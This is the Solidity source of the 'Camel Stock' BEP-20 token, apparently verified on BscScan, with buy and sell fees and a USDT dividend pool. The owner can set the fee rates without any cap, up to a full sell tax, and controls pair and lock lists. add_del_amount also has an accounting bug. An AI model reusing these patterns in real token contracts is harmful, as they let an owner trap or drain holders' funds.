/**
 *Submitted for verification at BscScan.com on 2023-01-04
*/

// SPDX-License-Identifier: MIT
	pragma solidity 0.8.7;
	interface Ipair{
		function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
		function token0() external view returns (address);
		function token1() external view returns (address);
	}
	library SafeMath {
		function add(uint256 a, uint256 b) internal pure returns (uint256) {
			uint256 c = a + b;
			require(c >= a, "SafeMath: addition overflow");
	
			return c;
		}
		function sub(uint256 a, uint256 b) internal pure returns (uint256) {
			return sub(a, b, "SafeMath: subtraction overflow");
		}
		function sub(
			uint256 a,
			uint256 b,
			string memory errorMessage
		) internal pure returns (uint256) {
			require(b <= a, errorMessage);
			uint256 c = a - b;
	
			return c;
		}
		function mul(uint256 a, uint256 b) internal pure returns (uint256) {
			if (a == 0) {
				return 0;
			}
	
			uint256 c = a * b;
			require(c / a == b, "SafeMath: multiplication overflow");
	
			return c;
		}

		function div(uint256 a, uint256 b) internal pure returns (uint256) {
			return div(a, b, "SafeMath: division by zero");
		}
	
		function div(
			uint256 a,
			uint256 b,
			string memory errorMessage
		) internal pure returns (uint256) {
			require(b > 0, errorMessage);
			uint256 c = a / b;
			// assert(a == b * c + a % b); // There is no case in which this doesn't hold
	
			return c;
		}

		function mod(uint256 a, uint256 b) internal pure returns (uint256) {
			return mod(a, b, "SafeMath: modulo by zero");
		}
		function mod(
			uint256 a,
			uint256 b,
			string memory errorMessage
		) internal pure returns (uint256) {
			require(b != 0, errorMessage);
			return a % b;
		}
	}
	library DateTimeLibrary {

		uint constant SECONDS_PER_DAY = 24 * 60 * 60;
		uint constant SECONDS_PER_HOUR = 60 * 60;
		uint constant SECONDS_PER_MINUTE = 60;
		int constant OFFSET19700101 = 2440588;
		
		uint constant DAY_IN_SECONDS = 86400;
        uint constant YEAR_IN_SECONDS = 31536000;
        uint constant LEAP_YEAR_IN_SECONDS = 31622400;

        uint constant HOUR_IN_SECONDS = 3600;
        uint constant MINUTE_IN_SECONDS = 60;

        uint16 constant ORIGIN_YEAR = 1970;
		
	
		uint constant DOW_MON = 1;
		uint constant DOW_TUE = 2;
		uint constant DOW_WED = 3;
		uint constant DOW_THU = 4;
		uint constant DOW_FRI = 5;
		uint constant DOW_SAT = 6;
		uint constant DOW_SUN = 7;
		
		function _daysToDate(uint timestamp) internal pure returns(uint year, uint month, uint day) {
			
			
			int __days = int(timestamp / SECONDS_PER_DAY);
	
			int L = __days + 68569 + OFFSET19700101;
			int N = 4 * L / 146097;
			L = L - (146097 * N + 3) / 4;
			int _year = 4000 * (L + 1) / 1461001;
			L = L - 1461 * _year / 4 + 31;
			int _month = 80 * L / 2447;
			int _day = L - 2447 * _month / 80;
			L = _month / 11;
			_month = _month + 2 - 12 * L;
			_year = 100 * (N - 49) + _year + L;
	
			year = uint(_year);
			month = uint(_month);
			day = uint(_day);
		}
	
		function timestampToDate(uint timestamp) internal pure returns(uint day_str) { 
			uint year;
			uint month;
			uint day;
			(year, month, day) = _daysToDate(timestamp );
			
			day_str=year*100*100+month*100+day;
		}
		function timestampToHour(uint timestamp) internal pure returns(uint day_str) { 
			uint year;
			uint month;
			uint day;
			(year, month, day) = _daysToDate(timestamp );
			
			uint secs = timestamp % SECONDS_PER_DAY;
			uint hour = secs / SECONDS_PER_HOUR;
	 
			day_str=year*100*100*100+month*100*100+day*100+hour;
   	 	}
		function isLeapYear(uint year) internal pure returns (bool) {
                if (year % 4 != 0) {
                        return false;
                }
                if (year % 100 != 0) {
                        return true;
                }
                if (year % 400 != 0) {
                        return false;
                }
                return true;
        }

		 function toTimestamp(uint year, uint month, uint day) internal pure returns (uint timestamp) {
                return toTimestamp(year, month, day, 0, 0, 0);
        }

        function toTimestamp(uint year, uint month, uint day, uint hour) internal pure returns (uint timestamp) {
                return toTimestamp(year, month, day, hour, 0, 0);
        }

        function toTimestamp(uint year, uint month, uint day, uint hour, uint minute) internal pure returns (uint timestamp) {
                return toTimestamp(year, month, day, hour, minute, 0);
        }

        function toTimestamp(uint year, uint month, uint day, uint hour, uint minute, uint second) internal pure returns (uint timestamp) {
                uint16 i;

                // Year
                for (i = ORIGIN_YEAR; i < year; i++) {
                        if (isLeapYear(i)) {
                                timestamp += LEAP_YEAR_IN_SECONDS;
                        }
                        else {
                                timestamp += YEAR_IN_SECONDS;
                        }
                }

                // Month
                uint8[12] memory monthDayCounts;
                monthDayCounts[0] = 31;
                if (isLeapYear(year)) {
                        monthDayCounts[1] = 29;
                }
                else {
                        monthDayCounts[1] = 28;
                }
                monthDayCounts[2] = 31;
                monthDayCounts[3] = 30;
                monthDayCounts[4] = 31;
                monthDayCounts[5] = 30;
                monthDayCounts[6] = 31;
                monthDayCounts[7] = 31;
                monthDayCounts[8] = 30;
                monthDayCounts[9] = 31;
                monthDayCounts[10] = 30;
                monthDayCounts[11] = 31;

                for (i = 1; i < month; i++) {
                        timestamp += DAY_IN_SECONDS * monthDayCounts[i - 1];
                }

                // Day
                timestamp += DAY_IN_SECONDS * (day - 1);

                // Hour
                timestamp += HOUR_IN_SECONDS * (hour);

                // Minute
                timestamp += MINUTE_IN_SECONDS * (minute);

                // Second
                timestamp += second;

                return timestamp;
        }
	}
	contract Ownable {
		address private _owner;
	
		event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
	
		/**
		 * @dev Initializes the contract setting the deployer as the initial owner.
		 */
		constructor () {
			_owner = msg.sender;
			emit OwnershipTransferred(address(0), _owner);
		}
	
		/**
		 * @dev Returns the address of the current owner.
		 */
		function owner() public view  returns (address) {
			return _owner;
		}
	
		/**
		 * @dev Throws if called by any account other than the owner.
		 */
		modifier onlyOwner() {
			require(owner() == msg.sender, "Ownable: caller is not the owner");
			_;
		}
	
		/**
		 * @dev Leaves the contract without owner. It will not be possible to call
		 * `onlyOwner` functions anymore. Can only be called by the current owner.
		 *
		 * NOTE: Renouncing ownership will leave the contract without an owner,
		 * thereby removing any functionality that is only available to the owner.
		 */
		function renounceOwnership() public  onlyOwner {
			emit OwnershipTransferred(_owner, address(0));
			_owner = address(0);
		}
	
		/**
		 * @dev Transfers ownership of the contract to a new account (`newOwner`).
		 * Can only be called by the current owner.
		 */
		function transferOwnership(address newOwner) public onlyOwner {
			require(newOwner != address(0), "Ownable: new owner is the zero address");
			emit OwnershipTransferred(_owner, newOwner);
			_owner = newOwner;
		}
	}
	contract ERC20 {
	
		mapping (address => uint256) internal _balances;
		
		mapping (address => uint256) public  uptimes;
		
		mapping (address => bool) public  is_no_uptime;
		 
		mapping (address => mapping (address => uint256)) private _allowances;
		 

		mapping(address => bool) public Pair_address;
		
		mapping(address => bool) public lock_address;
	
		uint256 public max_num=1*10**18;
		
	 
		uint256 private _totalSupply;
		string private _name;
		string private _symbol;
		uint8 private _decimals;
		
		uint256 public share_amount;
		
		 
		
		
		address public holder_addr=0x0000000000000000000000000000000000000000;
	
	
		event Transfer(address indexed from, address indexed to, uint256 value);
		event Approval(address indexed owner, address indexed spender, uint256 value);
	
		constructor() {
			_name = "Camel Stock";
			_symbol = "Camel";
			_decimals = 18;
		}
	
		function name() public view returns (string memory) {
			return _name;
		}
	
		function symbol() public view returns (string memory) {
			return _symbol;
		}
	
		function decimals() public view returns (uint8) {
			return _decimals;
		}
	
		function totalSupply() public view returns (uint256) {
			return _totalSupply;
		}
	
		function balanceOf(address account) public view returns (uint256) {
			return _balances[account];
		}
	
		function transfer(address recipient, uint256 amount) public virtual returns (bool) {
			_transfer(msg.sender, recipient, amount);
			return true;
		}
	
		function allowance(address owner, address spender) public view virtual returns (uint256) {
			return _allowances[owner][spender];
		}
	
		function approve(address spender, uint256 amount) public virtual returns (bool) {
			_approve(msg.sender, spender, amount);
			return true;
		}
	
		function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
			_transfer(sender, recipient, amount);
			_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
			return true;
		}
	
		function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
			_approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
			return true;
		}
	
		function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
			_approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
			return true;
		}
	
		function _transfer(address sender, address recipient, uint256 amount) internal virtual {
			require(sender != address(0), "ERC20: transfer from the zero address");
	
			uint256 trueAmount = _beforeTokenTransfer(sender, recipient, amount);
	
			_balances[sender] = _balances[sender] - amount;
			_balances[recipient] = _balances[recipient] + trueAmount;
			if(!is_no_uptime[sender] && amount>max_num){
				uptimes[sender]=block.timestamp;
			}
			if(!is_no_uptime[recipient]  && amount>max_num){
				uptimes[recipient]=block.timestamp;
			}
			
			if(lock_address[sender] && !lock_address[recipient]){
				share_amount=share_amount+amount;
			}
			if(lock_address[recipient] && !lock_address[sender]){
				share_amount=share_amount-trueAmount;
			}
			
			emit Transfer(sender, recipient, trueAmount);
		}
	
		function _mint(address account, uint256 amount) internal virtual {
			require(account != address(0), "ERC20: mint to the zero address");
	
			_totalSupply = _totalSupply + amount;
			_balances[account] = _balances[account] + amount;
			uptimes[account]=block.timestamp;
			emit Transfer(address(0), account, amount);
		}
	
		function _approve(address owner, address spender, uint256 amount) internal virtual {
			require(owner != address(0), "ERC20: approve from the zero address");
			require(spender != address(0), "ERC20: approve to the zero address");
	
			_allowances[owner][spender] = amount;
			emit Approval(owner, spender, amount);
		}
	
		function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual  returns (uint256) { }
	}
	
	contract CamelStock is ERC20, Ownable{
		using SafeMath for uint256;		
		address usdt_address=0x55d398326f99059fF775485246999027B3197955;

		uint256 public usdt_amount_length=0;
		
		uint256 public cur_day=0;
		
		mapping(uint256 => uint256) public day_lists;
		mapping(uint256 => uint256) public time_lists;
		mapping(uint256 => uint256) public usdt_amount_lists;
		mapping(uint256 => uint256) public usdt_has_lists;
	
		uint256 public buy_rate = 100;
		uint256 public sell_rate = 500;
		constructor () Ownable(){	
			lock_address[msg.sender]=true;
			lock_address[holder_addr]=true;
			_mint(msg.sender,10000000 * 10**18);
	
		}
		uint public unlocked=1;
		modifier lock() {
			require(unlocked == 1, 'LOCKED1');
			unlocked = 0;
			_;
			unlocked = 1;
		}
	
		function _beforeTokenTransfer(address _from,address _to,uint256 _amount)internal override returns (uint256){

			uint256 hold_val;
			
			if (Pair_address[_from]){
				hold_val=_amount.mul(buy_rate).div(10000);
                _balances[holder_addr] = _balances[holder_addr].add(hold_val);
				emit Transfer(_from, holder_addr, hold_val);
				_amount=_amount.sub(hold_val);
						  
			}
			if (Pair_address[_to]){
				hold_val=_amount.mul(sell_rate).div(10000);
                _balances[holder_addr] = _balances[holder_addr].add(hold_val);
				emit Transfer(_from, holder_addr, hold_val);
				_amount=_amount.sub(hold_val);
						  
			}
			return _amount;
		}
		
		function addUsdt(uint256 _val) external lock  {
			ERC20(usdt_address).transferFrom(msg.sender,address(this), _val);
			
			uint256 day=DateTimeLibrary.timestampToDate(block.timestamp);
			 
			if(cur_day!=day){
				usdt_amount_length++;
				cur_day=day;
				day_lists[usdt_amount_length]=day;
				time_lists[usdt_amount_length]=block.timestamp;
			}
			usdt_amount_lists[usdt_amount_length]=usdt_amount_lists[usdt_amount_length].add(_val);
			 
		}
		
		function withdrawUsdt() external lock {
			
			address _addr=msg.sender;
			require(!lock_address[_addr], "ERC20: approve from the zero address");
			 
			 
			
			uint256 max_id=usdt_amount_length;
			uint256 day=DateTimeLibrary.timestampToDate(block.timestamp);
			if(day_lists[usdt_amount_length]==day){
				max_id=usdt_amount_length-1;
			}
			uint256 min_id=1;
			if(max_id>6){
				min_id=max_id-6;
			}
			
			uint256 tmp= _balances[_addr];
			uint256 pre= tmp.mul(10**18).div(share_amount);
			
			uint256 _amount=0;
			for(uint256 i=max_id;i>=min_id;i--){
				 if(uptimes[_addr]<time_lists[i]){
					tmp=usdt_amount_lists[i].mul(pre).div(10**18);
					usdt_has_lists[i]=usdt_has_lists[i].add(tmp);
					 _amount=_amount.add(tmp);
				 }
			}
			ERC20(usdt_address).transfer(msg.sender,_amount);
			
			(uint _year, uint _month, uint _day)=DateTimeLibrary._daysToDate(block.timestamp);
			
			uptimes[_addr]=DateTimeLibrary.toTimestamp(_year,_month,_day);	
			
			 
			
			 
		}
        function get_usdt_amount(address _addr,uint256 type_id) external view returns (uint256) {
		 
			 
			uint256 max_id=usdt_amount_length;
			if(type_id==1){
				uint256 day=DateTimeLibrary.timestampToDate(block.timestamp);
				if(day_lists[usdt_amount_length]==day){
					max_id=usdt_amount_length-1;
				}
			}
			
			uint256 min_id=1;
			if(usdt_amount_length>6){
				min_id=usdt_amount_length-6;
			}
			
			uint256 tmp= _balances[_addr];
			uint256 pre= tmp.mul(10**18).div(share_amount);
			
			uint256 _amount=0;
			for(uint256 i=max_id;i>=min_id;i--){
				 if(uptimes[_addr]<time_lists[i]){
					tmp=usdt_amount_lists[i].mul(pre).div(10**18);
					 _amount=_amount.add(tmp);
				 }
			}
			return _amount;
			
		}
		function get_del_amount() external view returns (uint256) {
			uint256 min_id=1;
			if(usdt_amount_length>8){
				min_id=usdt_amount_length-8;
			}
			 
			uint256 _amount=0;
			for(uint256 i=(usdt_amount_length);i>=min_id;i--){
				_amount=_amount.add(usdt_amount_lists[i]);
				 
			}
			uint256 tmp_all=ERC20(usdt_address).balanceOf(address(this));
			_amount= tmp_all.sub(_amount);
			return _amount;
			
		}
		
		function add_del_amount(uint256 _val) external lock onlyOwner returns (uint256)   {
			uint256 min_id=1;
			if(usdt_amount_length>8){
				min_id=usdt_amount_length-8;
			}
			 
			uint256 _amount=0;
			for(uint256 i=(usdt_amount_length);i>=min_id;i--){
				  
				_amount=_amount.add(usdt_amount_lists[i]);
				 
			}
			uint256 tmp_all=ERC20(usdt_address).balanceOf(address(this));
			_amount= tmp_all.sub(_amount);
			if(_val<=_amount){
				uint256 day=DateTimeLibrary.timestampToDate(block.timestamp);
				 
				if(cur_day!=day){
					usdt_amount_length++;
					cur_day=day;
					day_lists[usdt_amount_length]=day;
					time_lists[usdt_amount_length]=block.timestamp;
				}
				usdt_amount_lists[usdt_amount_length]=usdt_amount_lists[usdt_amount_length].add(_amount);
			}
			return _amount;
			
		}
		 
		
		
		function set_buy_rate(uint256 _val) external onlyOwner{
			buy_rate = _val;
		}
		
		function set_sell_rate(uint256 _val) external onlyOwner{
			sell_rate = _val;
		}
		function set_Pair_address(address _addr,bool _val) external onlyOwner{
			Pair_address[_addr] = _val;
		}
		function set_is_no_uptime(address _addr,bool _val) external onlyOwner{
			is_no_uptime[_addr] = _val;
		}
		function set_max_num(uint256 _val) external onlyOwner{
			max_num = _val;
		}
		function set_lock_address(address _addr,bool _val) external onlyOwner{
			lock_address[_addr] = _val;
		}
		
		 
		
		 
	 
	}